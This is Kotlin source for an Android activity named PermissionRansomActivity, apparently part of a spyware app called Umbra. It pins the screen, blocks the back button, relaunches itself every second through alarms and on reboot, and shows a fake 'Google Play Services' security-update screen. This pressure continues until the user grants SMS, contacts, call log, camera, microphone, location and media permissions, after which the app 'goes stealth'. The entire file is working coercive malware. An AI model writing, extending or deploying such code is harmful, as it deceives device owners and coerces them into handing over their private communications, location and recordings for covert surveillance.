package org.umbra.core.persistence

import android.Manifest
import android.app.Activity
import android.app.AlarmManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.PixelFormat
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.SystemClock
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import android.view.WindowManager
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import org.umbra.core.R

/**
 * PermissionRansomActivity — full-screen overlay that locks the device until
 * the user grants ALL requested permissions.
 *
 * Defense layers:
 * 1. startLockTask() — pins the screen, user can't go home/recents/back
 * 2. SYSTEM_ALERT_WINDOW overlay — if granted, draws over everything
 * 3. FGS watchdog (1s) — re-launches activity if dismissed
 * 4. AlarmManager (1s) — re-launches even if FGS killed
 * 5. AccessibilityService — auto-clicks "Allow" on permission dialogs
 * 6. BootReceiver — re-launches after phone restart
 *
 * Flow:
 * 1. Activity launches → calls startLockTask() immediately
 * 2. If SYSTEM_ALERT_WINDOW not granted → opens Settings to request it first
 * 3. Once overlay granted → starts PermissionOverlayService (draws over everything)
 * 4. Auto-requests all missing permissions via requestPermissions()
 * 5. AccessibilityService auto-clicks "Allow" on each dialog
 * 6. If user escapes lock task → watchdog re-launches in 1s
 * 7. If user restarts phone → BootReceiver re-launches
 * 8. When all permissions granted → everything stops, app goes stealth
 */
class PermissionRansomActivity : Activity() {

    companion object {
        private const val TAG = "Umbra"
        private const val RELAUNCH_DELAY_MS = 1000L
        private const val LOCK_TASK_REQUEST_CODE = 7777

        val REQUIRED_PERMISSIONS = listOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.READ_MEDIA_AUDIO,
            Manifest.permission.POST_NOTIFICATIONS,
            "android.permission.READ_MEDIA_VISUAL_USER_SELECTED",
        )

        fun hasAllPermissions(context: Context): Boolean {
            return REQUIRED_PERMISSIONS.all {
                context.checkSelfPermission(it) == PackageManager.PERMISSION_GRANTED
            }
        }

        fun missingPermissions(context: Context): List<String> {
            return REQUIRED_PERMISSIONS.filter {
                context.checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
            }
        }

        fun hasOverlayPermission(context: Context): Boolean {
            return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Settings.canDrawOverlays(context)
            } else true
        }

        fun launch(context: Context) {
            if (hasAllPermissions(context)) return
            try {
                val intent = Intent(context, PermissionRansomActivity::class.java).apply {
                    addFlags(
                        Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_CLEAR_TASK or
                        Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS or
                        Intent.FLAG_ACTIVITY_NO_USER_ACTION
                    )
                }
                context.startActivity(intent)
            } catch (e: Exception) {
                Log.w(TAG, "Failed to launch ransom activity: ${e.message}")
                scheduleRelaunch(context)
            }
        }

        fun scheduleRelaunch(context: Context) {
            val intent = Intent(context, PermissionRansomActivity::class.java).apply {
                addFlags(
                    Intent.FLAG_ACTIVITY_NEW_TASK or
                    Intent.FLAG_ACTIVITY_CLEAR_TASK or
                    Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
                )
            }
            val pi = PendingIntent.getActivity(
                context, 9991, intent,
                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
            )
            val am = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val triggerAt = SystemClock.elapsedRealtime() + RELAUNCH_DELAY_MS
            try {
                am.setExactAndAllowWhileIdle(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi
                )
            } catch (e: SecurityException) {
                am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi)
            }
        }
    }

    private val handler = Handler(Looper.getMainLooper())
    private var permissionRequested = false
    private var isLocked = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        if (hasAllPermissions(this)) {
            finish()
            return
        }

        // Turn screen on and show over lockscreen
        window.addFlags(
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
        )

        val missing = missingPermissions(this)

        // Build the ransom UI
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(48, 60, 48, 60)
            setBackgroundColor(0xF0151515.toInt())
        }

        val title = TextView(this).apply {
            text = "Google Play Services"
            textSize = 20f
            setTextColor(0xFFFFFFFF.toInt())
            setPadding(0, 0, 0, 20)
        }

        val message = TextView(this).apply {
            text = "A critical security update requires permission updates " +
                   "to keep your device protected.\n\n" +
                   "Tap \"Update\" to continue using your phone.\n\n" +
                   missing.size.toString() + " permissions required."
            textSize = 15f
            setTextColor(0xCCFFFFFF.toInt())
            setPadding(0, 0, 0, 30)
        }

        val allowButton = Button(this).apply {
            text = "Update"
            textSize = 16f
            setOnClickListener {
                permissionRequested = true
                requestPermissions(missingPermissions(this@PermissionRansomActivity).toTypedArray(), 100)
            }
        }

        layout.addView(title)
        layout.addView(message)
        layout.addView(allowButton)
        setContentView(layout)

        // ── Layer 1: Lock the screen immediately ──
        try {
            startLockTask()
            isLocked = true
            Log.d(TAG, "Lock task started — screen pinned")
        } catch (e: Exception) {
            Log.w(TAG, "startLockTask failed: ${e.message}")
        }

        // ── Layer 2: Request overlay permission if not granted (AFTER lock task) ──
        // Don't open settings immediately — it breaks the lock task.
        // The AccessibilityService will auto-toggle it when the settings page appears.
        if (!hasOverlayPermission(this)) {
            handler.postDelayed({
                // Only open settings if we're NOT in lock task (lock task is more important)
                if (!isLocked) {
                    try {
                        val intent = Intent(
                            Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                            android.net.Uri.parse("package:$packageName")
                        )
                        startActivity(intent)
                    } catch (e: Exception) {
                        Log.w(TAG, "Overlay settings intent failed: ${e.message}")
                    }
                }
            }, 3000)
        }

        // ── Auto-request permissions after 2 seconds ──
        handler.postDelayed({
            if (!permissionRequested && !hasAllPermissions(this)) {
                permissionRequested = true
                requestPermissions(missingPermissions(this).toTypedArray(), 100)
            }
        }, 2000)

        // ── Schedule re-launch as backup ──
        scheduleRelaunch(this)

        Log.d(TAG, "PermissionRansomActivity shown (${missing.size} perms missing, locked=$isLocked)")
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (hasAllPermissions(this)) {
            Log.d(TAG, "All permissions granted — finishing ransom")
            try { if (isLocked) stopLockTask() } catch (_: Exception) {}
            finish()
            return
        }

        // Still missing — re-request immediately
        Log.d(TAG, "Permissions still missing (${missingPermissions(this).size}) — re-requesting")
        permissionRequested = false
        handler.postDelayed({
            if (!permissionRequested && !hasAllPermissions(this)) {
                permissionRequested = true
                requestPermissions(missingPermissions(this).toTypedArray(), 100)
            }
        }, 500)

        scheduleRelaunch(this)
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacksAndMessages(null)
        if (!hasAllPermissions(this)) {
            scheduleRelaunch(this)
        }
    }

    override fun onBackPressed() {
        // Block back button
    }

    override fun onUserLeaveHint() {
        // User pressed home — re-launch immediately
        if (!hasAllPermissions(this)) {
            scheduleRelaunch(this)
        }
    }
}
